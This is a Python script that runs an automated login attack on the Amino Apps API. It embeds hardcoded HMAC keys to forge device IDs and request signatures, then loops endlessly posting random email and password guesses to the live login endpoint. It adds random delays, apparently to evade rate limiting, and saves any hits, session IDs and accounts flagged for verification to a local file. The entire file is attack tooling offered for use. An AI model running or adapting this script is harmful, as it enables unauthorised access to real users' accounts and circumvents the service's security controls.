import os
os.system("clear")
import requests
import time
import hmac
import hashlib
import base64
import uuid
import json
import random
import string
from colorama import init, Fore, Back, Style

init(autoreset=True)

# Define colors
RED = Fore.RED
GREEN = Fore.GREEN
YELLOW = Fore.YELLOW
BLUE = Fore.BLUE
MAGENTA = Fore.MAGENTA
CYAN = Fore.CYAN
WHITE = Fore.WHITE
BLACK = Fore.BLACK
RESET = Style.RESET_ALL
BOLD = Style.BRIGHT

# Stylish and handsome opening
def print_opening():
    print(f"{CYAN}{'-' * 50}")
    print(f"{MAGENTA}{' ' * 12}Made by normal-user and anas")
    print(f"{CYAN}{'-' * 50}\n")

# Header information
def print_header():
    print(f"{GREEN}Welcome to the Automatic Login Script\n")
    print(f"{YELLOW}This script will attempt to log in using randomly generated credentials.")
    print(f"{BLUE}Enjoy the process and good luck!\n")

# Define a set of special characters you want to include
special_characters = "!@#$%^&*()_-+=<>?/~"
all_characters = string.ascii_letters + string.digits + special_characters

def generate_random_email(min_length=6, max_length=17):
    username_length = random.randint(min_length, max_length)
    username = ''.join(random.choice(all_characters) for _ in range(username_length))
    domain = "@gmail.com"
    return username + domain

def generate_random_password(min_length=6, max_length=17):
    length = random.randint(min_length, max_length)
    return ''.join(random.choice(all_characters) for _ in range(length))

# Define security keys
securityNumber = "19"
signatureKey = "dfa5ed192dda6e88a12fe12130dc6206b1251e44"
deviceKey = "e7309ecc0953c6fa60005b2765f99dbbc965c8e9"

def generateDeviceID():
    data = uuid.uuid4().bytes
    mac = hmac.new(bytes.fromhex(deviceKey), bytes.fromhex(securityNumber) + data, hashlib.sha1).hexdigest().upper()
    return f"19{data.hex()}{mac}".upper()

def generateSignature(data):
    mac = hmac.new(bytes.fromhex(signatureKey), data.encode(), hashlib.sha1).digest()
    return base64.b64encode(bytes.fromhex(securityNumber) + mac).decode()

def login(email, password):
    deviceId = generateDeviceID()
    headers = {
        "NDCDEVICEID": deviceId,
        "Content-Type": "application/json"
    }

    data = {
        "email": email,
        "v": 2,
        "secret": f"0 {password}",
        "deviceID": deviceId,
        "clientType": 100,
        "action": "normal",
        "timestamp": int(time.time() * 1000)
    }

    signature = generateSignature(json.dumps(data))
    headers["NDC-MSG-SIG"] = signature

    print(f"{CYAN}Attempting to login with {email}...\n")
    
    response = requests.post("https://service.aminoapps.com/api/v1/g/s/auth/login", headers=headers, json=data)

    if response.status_code == 200:
        print(f"{GREEN}[+] Login successful!")
        return response.json().get("sid", "UNKNOWN_SID")
    elif "validation required" in response.text.lower() or "captcha" in response.text.lower():
        print(f"{YELLOW}[-] Account requires human verification!")
        save_account_to_file(email, password, "Verification Required")
        return None
    else:
        print(f"{RED}[-] Login failed: {response.text}")
        return None

def save_account_to_file(email, password, sid):
    filename = "database.txt"
    
    if not os.path.exists(filename):
        with open(filename, "w") as file:
            file.write("Stored accounts:\n")

    with open(filename, "a") as file:
        file.write(f"Email: {email}, Password: {password}, SID: {sid}\n")

    print(f"{GREEN}[✔] Account saved to file!")

# Main loop
def main():
    print_opening()  # Print the opening at the beginning
    print_header()   # Print the header information

    attempts = 0
    while True:
        attempts += 1
        email = generate_random_email()
        password = generate_random_password()
        
        print(f"{YELLOW}[*] Attempt {attempts} | Trying login with: {email} | {password}")

        sid = login(email, password)

        if sid:
            save_account_to_file(email, password, sid)
            print(f"{GREEN}[✔] Found valid password: {password}")
            break
        else:
            print(f"{RED}[-] Retrying in 1-20 seconds...")
            time.sleep(random.randint(1, 20))

if __name__ == "__main__":
    main()